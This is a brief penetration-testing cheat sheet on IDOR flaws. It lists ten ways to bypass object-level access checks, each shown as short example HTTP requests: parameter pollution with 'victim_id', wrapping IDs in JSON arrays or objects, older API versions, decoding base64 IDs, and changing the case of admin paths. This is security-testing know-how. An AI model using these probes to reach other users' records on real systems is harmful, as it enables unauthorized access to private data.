## IDOR (Insecure Direct Object Reference)

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

1. Add parameters onto the endpoints for example, if there was
```html
GET /api/v1/getuser
[...]
```
Try this to bypass
```html
GET /api/v1/getuser?id=1234
[...]
```

2. HTTP Parameter pollution

```html
POST /api/get_profile
[...]
user_id=hacker_id&user_id=victim_id
```

3. Add .json to the endpoint

```html
GET /v2/GetData/1234
[...]
```
Try this to bypass
```html
GET /v2/GetData/1234.json
[...]
```

4. Test on outdated API Versions

```html
POST /v2/GetData
[...]
id=123
```
Try this to bypass
```html
POST /v1/GetData
[...]
id=123
```

5. Wrap the ID with an array.

```html
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```html
POST /api/get_profile
[...]
{"id":[111]}
```

6. Wrap the ID with a JSON object

```html
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```html
POST /api/get_profile
[...]
{"user_id":{"user_id":111}}
```

7. JSON Parameter Pollution

```html
POST /api/get_profile
[...]
{"user_id":"hacker_id","user_id":"victim_id"}
```

8. Try decode the ID, if the ID encoded using md5,base64,etc
```html
GET /GetUser/dmljdGltQG1haWwuY29t
[...]
```
dmljdGltQG1haWwuY29t => victim@mail.com

9. If the website using graphql, try to find IDOR using graphql!
```html
GET /graphql
[...]
```
```html
GET /graphql.php?query=
[...]
```

10. MFLAC (Missing Function Level Access Control)
```
GET /admin/profile
```
Try this to bypass
```
GET /ADMIN/profile
```

Source: [@swaysThinking](https://twitter.com/swaysThinking) and other medium writeup!
